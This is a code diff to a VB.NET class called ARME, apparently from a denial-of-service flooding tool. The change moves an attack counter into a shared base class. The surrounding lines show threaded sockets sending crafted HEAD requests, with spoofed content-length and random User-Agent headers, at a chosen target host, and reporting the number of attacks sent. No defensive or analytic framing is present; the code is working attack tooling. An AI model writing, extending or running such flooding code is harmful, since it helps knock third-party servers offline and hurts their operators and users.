@@ -12,7 +12,6 @@ Public Class ARME
     Private Port As Integer
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
-    Private Attacks As Integer = 0
     Private RandomFile As Boolean
     Public Sub New(model As ArmeModel)
         If Not AttackRunning = True Then
@@ -46,8 +45,7 @@ Public Class ARME
 
         ThreadsEnded = ThreadsEnded + 1
         If ThreadsEnded <= ThreadstoUse Then
-            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
@@ -66,8 +64,7 @@ Public Class ARME
             Next
             AttackRunning = False
 
-            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
 
         Else
             GetFloodsBase().SetMessage("ARME Attack:, Not Running!")
@@ -119,8 +116,8 @@ Public Class ARME
                         Dim HttpString = "HEAD /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & "User-Agent: " & headers() & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString))
 
-                        Attacks = Attacks + 1
-                        GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * HttpString.Length)
+                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * HttpString.Length)
 
                     Next i
                     Dim j As Integer
@@ -134,7 +131,7 @@ Public Class ARME
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                         socketArray(j).Close()
                     Next j
                     Continue Do
